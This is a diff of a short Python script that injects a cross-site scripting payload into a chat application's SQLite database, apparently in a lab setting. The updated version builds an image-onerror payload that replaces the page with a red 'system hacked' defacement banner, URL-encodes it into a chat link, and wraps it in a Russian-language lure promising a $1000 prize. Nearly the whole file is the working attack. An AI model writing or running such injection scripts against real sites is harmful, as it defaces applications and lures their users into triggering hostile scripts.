@@ -1,5 +1,11 @@
 import sqlite3
-payload = """<a href="javascript:document.body.innerHTML='<div style=\\'background:#111;color:red;font-size:50px;text-align:center;padding-top:20vh;height:100vh;font-family:monospace;\\'>[!] XSS: СИСТЕМА ВЗЛОМАНА</div>';">Нажми сюда, чтобы выиграть 1000$!</a>"""
+import urllib.parse
+
+js_payload = """<img src=x onerror="document.body.innerHTML='<div style=\\'background:#111;color:red;font-size:50px;text-align:center;padding-top:20vh;height:100vh;font-family:monospace;\\'>[!] XSS: СИСТЕМА ВЗЛОМАНА</div>'">"""
+
+encoded_payload = urllib.parse.quote(js_payload)
+
+payload = f"""<a href="/chat?name={encoded_payload}">Нажми сюда, чтобы выиграть 1000$!</a>"""
 
 conn = sqlite3.connect('app.db')
 conn.execute(
@@ -8,4 +14,4 @@ conn.execute(
 )
 conn.commit()
 conn.close()
-print("XSS-сообщение от Ивана успешно внедрено в базу данных!")
+print("Ссылка с дефейсом внедрена в БД.")
